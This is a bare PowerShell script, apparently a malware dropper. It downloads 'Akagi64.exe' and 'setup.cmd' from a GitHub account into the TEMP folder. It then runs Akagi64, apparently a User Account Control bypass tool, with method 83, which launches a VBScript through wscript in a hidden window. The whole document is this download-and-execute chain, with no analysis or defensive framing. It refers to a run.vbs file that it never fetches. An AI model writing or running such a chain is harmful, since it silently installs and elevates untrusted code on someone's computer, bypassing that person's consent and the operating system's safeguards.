Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/Akagi64.exe' -OutFile "$env:TEMP\Akagi64.exe" -UseBasicParsing
Invoke-WebRequest 'https://github.com/johnbunkerton/main/raw/refs/heads/main/setup.cmd' -OutFile "$env:TEMP\setup.cmd" -UseBasicParsing

Start-Process "$env:TEMP\Akagi64.exe" -ArgumentList "83 wscript.exe `"$env:TEMP\run.vbs`"" -WindowStyle Hidden
